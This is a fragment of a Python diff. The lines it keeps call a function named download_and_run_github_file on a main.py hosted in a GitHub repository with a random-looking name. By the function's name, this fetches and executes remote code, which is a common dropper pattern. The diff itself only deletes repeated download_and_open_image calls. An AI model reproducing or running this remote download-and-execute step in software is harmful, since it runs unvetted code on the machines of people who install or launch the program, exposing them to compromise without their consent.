@@ -47,9 +47,3 @@ def download_and_run_github_file(url):
 github_file_url = "https://github.com/RobertsRob/1231waedewa2131/blob/main/main.py"
 download_and_run_github_file(github_file_url)
 
-
-
-download_and_open_image(image_url)
-download_and_open_image(image_url)
-download_and_open_image(image_url)
-download_and_open_image(image_url)
